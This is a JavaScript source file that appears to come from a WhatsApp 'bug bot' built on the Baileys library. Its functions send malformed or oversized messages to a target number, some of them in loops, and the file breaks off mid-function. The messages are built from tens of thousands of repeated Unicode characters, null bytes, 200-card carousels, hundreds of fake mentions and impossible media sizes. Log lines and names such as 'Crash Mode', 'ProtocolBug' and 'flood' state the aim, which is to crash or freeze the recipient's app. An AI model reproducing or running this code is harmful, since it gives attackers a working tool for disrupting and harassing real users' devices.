 // utils/bugUtils.js
const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

// ===================== CAROUSEL DELAY =====================
async function carouselDelay(client, target) {
  let haxxn = 2;
  for (let x = 0; x < haxxn; x++) {
    let push = [];
    // Réduit de 1000 à 200 cartes pour éviter la surcharge
    for (let i = 0; i < 200; i++) {
      push.push({
        body: { text: `\u0000\u0000\u0000\u0000\u0000` },
        footer: { text: "" },
        header: {
          title: "Masbug\u0000\u0000\u0000\u0000",
          hasMediaAttachment: true,
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            fileLength: "591",
            height: 0,
            width: 0,
            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
            mediaKeyTimestamp: "1721344123",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            scanLengths: [247, 201, 73, 63],
            midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        nativeFlowMessage: { buttons: [] }
      });
    }

    const carousel = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: { text: "\u0000\u0000\u0000\u0000" },
              footer: { text: "Morphins" },
              header: { hasMediaAttachment: false },
              carouselMessage: { cards: [...push] }
            }
          }
        }
      },
      {}
    );

    await client.relayMessage(target, carousel.message, {
      messageId: carousel.key.id
    });
  }
}

// ===================== THUNDERBLAST IOS1 =====================
async function thunderblast_ios1(client, target) {
  const TravaIphone = "𑇂𑆵𑆴𑆿".repeat(60000);

  const genMsg = (fileName, bodyText) =>
    generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc",
                  mimetype: "application/json",
                  fileName,
                  fileLength: "999999999999",
                  mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                },
                hasMediaAttachment: true,
              },
              body: { text: bodyText },
              nativeFlowMessage: {
                messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_cta":"🚀","flow_id":"UNDEFINEDONTOP"}`,
              },
              contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                groupMentions: [
                  { groupJid: "1@newsletter", groupSubject: "UNDEFINEDONTOP" },
                ],
              },
            },
          },
        },
      }),
      {}
    );

  const msg1 = genMsg(`${TravaIphone}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
  await client.relayMessage(target, msg1.message, { messageId: msg1.key.id });

  const msg2 = genMsg(
    "UNDEFINEDONTOP",
    "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000)
  );
  await client.relayMessage(target, msg2.message, { messageId: msg2.key.id });

  const locMsg = generateWAMessageFromContent(
    target,
    {
      locationMessage: {
        degreesLatitude: 173.282,
        degreesLongitude: -19.378,
        name: TravaIphone,
        url: "https://youtube.com/@ShinZ.00",
      },
    },
    {}
  );
  await client.relayMessage(target, locMsg.message, { messageId: locMsg.key.id });

  const extMsg = generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: TravaIphone,
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "UNDEFINEDONTOP↕️" + "ꦾ".repeat(50000),
          },
        },
      },
    },
    {}
  );
  await client.relayMessage(target, extMsg.message, { messageId: extMsg.key.id });
}

// ===================== ALL DELAY =====================
async function alldelay(client, target, loops = 30, pause = 1500) {
  const start = Date.now();

  for (let i = 0; i < loops; i++) {
    try {
      await DelayInvisNew(client, target);
      await superdelayinvid(client, target);
      await delayCrash(client, target, false);
      await KingBroadcast(client, target, true);
      await KingDelayMess(client, target, true);

      console.log(`⚡ Vague ${i + 1}/${loops} envoyée sur ${target}`);

      await new Promise(res => setTimeout(res, pause));
    } catch (err) {
      console.error("❌ Erreur dans alldelay:", err);
    }
  }

  const end = Date.now();
  const seconds = ((end - start) / 1000).toFixed(2);
  console.log(`✅ alldelay terminé pour: ${target} en ${seconds}s`);
}

// ===================== CALL HOME =====================
async function callHome(client, target, ptcp = true) {
  try {
    const conf = ptcp ? { participant: { jid: target } } : {};

    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: { hasMediaAttachment: false },
              body: {
                text: "⏤⃟͟𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒 ꙳𝐂𝐀𝐋𝐋͞⃟⏤͟͟͞͞͠🌹✦",
              },
              nativeFlowMessage: {
                buttons: [
                  { name: "cta_call", buttonParamsJson: JSON.stringify({ status: "📞" }) },
                  { name: "call_permission_request", buttonParamsJson: "" },
                ],
              },
            },
          },
        },
      },
      {}
    );

    await client.relayMessage(target, msg.message, { ...conf, messageId: msg.key.id });
    console.log("✅ callHome envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur callHome:", err);
  }
}

// ===================== CAROUSELS2 =====================
async function carousels2(client, target, fJids = false) {
  try {
    const media = await prepareWAMessageMedia(
      { image: { url: "https://files.catbox.moe/c11niu.jpeg" } },
      { upload: client.waUploadToServer }
    );

    const header = proto.Message.InteractiveMessage.Header.fromObject({
      imageMessage: media.imageMessage,
      title: "⏤⃟͟𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒 ꙳𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋͞⃟⏤͟͟͞͞͠🌹✦",
      gifPlayback: false,
      subtitle: "⚡ Carrousel Crash ⚡",
      hasMediaAttachment: true,
    });

    // Réduit de 1000 à 200 cartes
    const cards = Array.from({ length: 200 }, () => ({
      header,
      body: { text: "⏤⃟͟𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒 ꙳𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋͞⃟⏤͟͟͞͞͠🌹✦" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({ display_text: "🔗 Voir", url: "https://example.com" }),
          },
        ],
      },
    }));

    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "⚡ Carrousel spécial DARKNESS ⚡" },
              footer: { text: "𓆩⏤⃟͟𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒𓆪" },
              carouselMessage: { cards, messageVersion: 1 },
            },
          },
        },
      },
      {}
    );

    await client.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      ...(fJids ? { participant: { jid: target } } : {}),
    });

    console.log("✅ carousels2 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur dans carousels2:", err);
  }
}

// ===================== CAROUSEL X =====================
async function CarouselX(client, target) {
  try {
    let push = [];
    // Réduit de 1020 à 200 cartes
    for (let i = 0; i < 200; i++) {
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤ" }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤ" }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: "⏤⃟͟𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒 ꙳𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋͞⃟⏤͟͟͞͞͠🌹✦",
          hasMediaAttachment: true,
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
            mimetype: "image/jpeg",
            fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            fileLength: "10840",
            height: 10,
            width: 10,
            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
            mediaKeyTimestamp: "1721344123",
            jpegThumbnail: ""
          }
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
      });
    }

    const carousel = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.create({
                text: `${"𑜦".repeat(20000)} 🚀 Crash Mode activé\n\u0000`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: "`YT:` https://youtube.com/@Darkness"
              }),
              header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: push })
            })
          }
        }
      },
      {}
    );

    await client.relayMessage(target, carousel.message, {
      messageId: carousel.key.id,
      participant: { jid: target },
    });

    console.log("✅ CarouselX envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur dans CarouselX:", err);
  }
}

// ===================== APAYA =====================
async function apaya(client, target) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "33333333333333333@newsletter",
            newsletterName: "⏤⃟͟𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒 ꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🌹✦" + "ê¦¾".repeat(20000),
            jpegThumbnail: Buffer.from(""),
            caption: "ê¦½".repeat(20000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});
    await client.relayMessage(target, msg.message, { messageId: msg.key.id });
    console.log(`✅ apaya flood envoyé sur ${target}`);
  } catch (err) {
    console.error("❌ Erreur dans apaya:", err);
  }
}

// ===================== BULLDOZER =====================
async function bulldozer(client, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              // Réduction de 40000 à 500 mentions
              ...Array.from({ length: 500 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});
  if (!msg.key || !msg.key.id) {
    msg.key = { remoteJid: target, fromMe: true, id: (Math.random() * 1e16).toString(36) };
  }

  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
          },
        ],
      },
    ],
  });
}

// ===================== ALL PROTOCOL =====================
async function allProtocol(client, target, loops = 20) {
  const start = Date.now();

  for (let i = 0; i < loops; i++) {
    try {
      await DelayInvisNew(client, target);
      await superdelayinvid(client, target);
      await delayCrash(client, target, false, 300);
      await bulldozer(client, target);
      await protocolbug1(client, target, true);
      await protocolbug2(client, target, true);
      await protocolbug3(client, target, true);
      await protocolbug6(client, target, true);
      await protocolbug7(client, target, true);
      await protocolbug8(client, target, true);
      await KingBroadcast(client, target, true);
      await KingDelayMess(client, target, true);
      await new Promise(res => setTimeout(res, 500));
    } catch (err) {
      console.error("❌ Erreur dans allProtocol:", err);
    }
  }

  const end = Date.now();
  const seconds = ((end - start) / 1000).toFixed(2);
  console.log(`✅ allProtocol terminé pour: ${target} en ${seconds}s`);
}

// ===================== DELAY INVIS NEW =====================
async function DelayInvisNew(client, target) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "> -FatrCR",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            // Réduction de 30000 à 500 mentions
            mentionedJid: Array.from({ length: 500 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});
  if (!msg.key || !msg.key.id) {
    msg.key = { remoteJid: target, fromMe: true, id: (Math.random() * 1e16).toString(36) };
  }

  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }
        ]
      }
    ]
  });
}

// ===================== SUPER DELAY INVID =====================
async function superdelayinvid(client, target) {
  const payload = {
    extendedTextMessage: {
      text: "⏤⃟͟𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒 ꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🌹✦",
      contextInfo: {
        participant: "13135550002@s.whatsapp.net",
        quotedMessage: {
          extendedTextMessage: { text: "⏤⃟͟𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒 ꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🌹✦" },
        },
        remoteJid: "status@broadcast"
      }
    }
  };

  const msg = generateWAMessageFromContent(target, { extendedTextMessage: payload.extendedTextMessage }, {});
  await client.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ===================== DELAY CRASH =====================
async function delayCrash(client, target, mention = false, delayMs = 500) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mimetype: "image/jpeg",
          caption: "💥 DARKNESS-CRASH",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          contextInfo: {
            // Réduction de 30000 à 500 mentions
            mentionedJid: Array.from({ length: 500 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});
  await client.relayMessage(target, msg.message, { messageId: msg.key.id });

  if (mention) {
    await client.relayMessage(target, {
      statusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } }
    });
  }

  await new Promise(res => setTimeout(res, delayMs));
}

// ===================== PROTOCOL BUG 1 =====================
async function protocolbug1(client, target, mention = false) {
  try {
    // Réduction du nombre de sections (50 au lieu de 9741)
    const delaymention = Array.from({ length: 50 }, (_, r) => ({
      title: "⩀".repeat(9741),
      rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
    }));

    const MSG = {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "🌈 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 𝐁𝐮𝐠",
            listType: 2,
            buttonText: null,
            sections: delaymention,
            singleSelectReply: { selectedRowId: "🌐" },
            contextInfo: {
              // Réduction des mentions (500 au lieu de 9741)
              mentionedJid: Array.from({ length: 500 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              participant: target,
              remoteJid: target,
              forwardingScore: 9741,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "9741@newsletter",
                serverMessageId: 1,
                newsletterName: "x!s - Darkness",
              },
            },
            description: "( # )",
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, MSG, {});
    await client.relayMessage(target, msg.message, { messageId: msg.key.id });
    await client.relayMessage("status@broadcast", msg.message, { messageId: msg.key.id, statusJidList: [target] });

    if (mention) {
      await client.relayMessage(target, {
        statusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } }
      }, {
        additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "🌐 Protocol Mention Flood" }, content: undefined }]
      });
    }
    console.log("✅ ProtocolBug1 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug1:", err);
  }
}

// ===================== PROTOCOL BUG 2 =====================
async function protocolbug2(client, target, mention = false) {
  try {
    const generateMessage = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            caption: "⚡ ProtocolBug2 ⚡",
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "19769",
            height: 354,
            width: 783,
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            jpegThumbnail: null,
            contextInfo: {
              // Réduction de 30000 à 500 mentions
              mentionedJid: Array.from({ length: 500 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              participant: target,
              remoteJid: target,
              forwardingScore: 9741,
              isForwarded: true,
            },
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});
    await client.relayMessage(target, msg.message, { messageId: msg.key.id });
    await client.relayMessage("status@broadcast", msg.message, { messageId: msg.key.id, statusJidList: [target] });

    if (mention) {
      await client.relayMessage(target, {
        statusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } }
      }, {
        additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "⚡ ProtocolBug2 Mention ⚡" }, content: undefined }]
      });
    }
    console.log("✅ ProtocolBug2 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug2:", err);
  }
}

// ===================== PROTOCOL BUG 3 =====================
async function protocolbug3(client, target, mention = false) {
  try {
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
            fileLength: "999999",
            seconds: 999999,
            mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
            caption: "\u9999",
            height: 999999,
            width: 999999,
            fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
            directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1743742853",
            contextInfo: {
              isSampled: true,
              // Réduction de 30000 à 500 mentions
              mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
              ]
            },
            streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
            thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
            thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
            thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
            annotations: [
              {
                embeddedContent: {
                  embeddedMusic: {
                    musicContentMediaId: "kontol",
                    songId: "peler",
                    author: "\u9999",
                    title: "\u9999",
                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                    countryBlocklist: true,
                    isExplicit: true,
                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                  }
                },
                embeddedAction: null
              }
            ]
          }
        }
      }
    }, {});

    await client.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        { tag: "meta", attrs: {}, content: [ { tag: "mentioned_users", attrs: {}, content: [ { tag: "to", attrs: { jid: target }, content: undefined } ] } ] }
      ]
    });

    if (mention) {
      await client.relayMessage(target, {
        groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } }
      }, {
        additionalNodes: [ { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined } ]
      });
    }
  } catch (err) {
    console.error("❌ Erreur ProtocolBug3:", err);
  }
}

// ===================== PROTOCOL BUG 6 =====================
async function protocolbug6(client, target, mention = false) {
  try {
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "⚡ ProtocolBug6 ⚡", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "flex_agency",
              paramsJson: "\u0000".repeat(500000),
              version: 3,
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9999,
              forwardedNewsletterMessageInfo: {
                newsletterName: "x!s - Darkness",
                newsletterJid: "120363319314627296@newsletter",
                serverMessageId: 1,
              },
            },
          },
        },
      },
    }, {});

    await client.relayMessage(target, msg.message, { messageId: msg.key.id });
    await client.relayMessage("status@broadcast", msg.message, { messageId: msg.key.id, statusJidList: [target] });

    if (mention) {
      await client.relayMessage(target, {
        statusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } }
      }, {
        additionalNodes: [ { tag: "meta", attrs: { is_status_mention: "⚡ ProtocolBug6 Mention ⚡" }, content: undefined } ]
      });
    }
    console.log("✅ ProtocolBug6 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug6:", err);
  }
}

// ===================== PROTOCOL BUG 7 =====================
async function protocolbug7(client, target, mention = false) {
  try {
    // Réduction des mentions (500 au lieu de 40000)
    const mentionedJids = Array.from({ length: 500 }, () => `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`);

    const audioMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
      mimetype: "audio/mpeg",
      fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
      fileLength: 9999999999,
      seconds: 999999,
      ptt: true,
      mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
      fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
      directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
      contextInfo: {
        mentionedJid: mentionedJids,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: "⚡ Darkness Flood ⚡"
        }
      }
    };

    const msg = generateWAMessageFromContent(target, { ephemeralMessage: { message: { audioMessage } } }, {});
    await client.relayMessage(target, msg.message, { messageId: msg.key.id });
    await client.relayMessage("status@broadcast", msg.message, { messageId: msg.key.id, statusJidList: [target] });

    if (mention) {
      await client.relayMessage(target, {
        statusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } }
      }, {
        additionalNodes: [ { tag: "meta", attrs: { is_status_mention: "⚡ ProtocolBug7 Mention ⚡" }, content: undefined } ]
      });
    }
    console.log("✅ ProtocolBug7 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug7:", err);
  }
}

// ===================== PROTOCOL BUG 8 =====================
async function protocolbug8(client, target, mention = false) {
  try {
    // Réduction des mentions (500 au lieu de 40000)
    const mentionedList = [
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];

    const embeddedMusic = {
      musicContentMediaId: "589608164114571",
      songId: "870166291800508",
      author: ".Darkness Official" + "⚡".repeat(5000),
      title: "Zoro",
      artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
      artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
      isExplicit: true
    };

    const videoMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "⚡ ProtocolBug8 ⚡",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      contextInfo: { mentionedJid: mentionedList, remoteJid: target },
      annotations: [{ embeddedContent: { embeddedMusic } }]
    };

    const msg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {});
    await client.relayMessage(target, msg.message, { messageId: msg.key.id });
    await client.relayMessage("status@broadcast", msg.message, { messageId: msg.key.id, statusJidList: [target] });

    if (mention) {
      await client.relayMessage(target, {
        statusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } }
      }, {
        additionalNodes: [ { tag: "meta", attrs: { is_status_mention: "⚡ ProtocolBug8 Mention ⚡" }, content: undefined } ]
      });
    }
    console.log("✅ ProtocolBug8 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug8:", err);
